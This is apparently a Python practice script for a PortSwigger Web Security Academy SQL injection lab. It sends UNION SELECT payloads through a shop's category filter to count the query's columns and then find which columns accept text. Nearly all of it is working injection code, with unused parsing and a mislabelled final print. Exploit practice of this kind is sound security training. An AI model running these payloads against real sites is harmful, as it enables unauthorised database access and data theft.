import requests
from bs4 import BeautifulSoup


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    if resp.status_code != 200:
        print(f'Error code {resp.status_code} with text: {resp.text}\n')
        return resp
    soup = BeautifulSoup(resp.text, 'html.parser')
    return resp

if __name__ == "__main__":
    site = "acd41f561eb434da803264f500610009.web-security-academy.net"
    category = "Gifts"
    s = requests.Session()
    url = f'https://{site}'
    login_url = f'https://{site}/login'

    columns = 0
    for i in range(0, 10):
        pstring = f"{category}' UNION SELECT null"
        nstring = i * ",null"
        qstring = f'{pstring}{nstring} --'
        resp = try_category(qstring)
        if resp.status_code == 200:
            columns = i + 1
            print(f'Number of columns: {columns}')
            break
    
    resp_one = try_category(f"{category}' UNION SELECT 'abcde',null,null --")
    resp_two = try_category(f"{category}' UNION SELECT null,'abcde',null --")
    resp_three = try_category(f"{category}' UNION SELECT null,null,'abcde' --")

    if resp_one.status_code == 200:
        print(f'Error code {resp_one.status_code} with text: {resp_one.text}\n')
    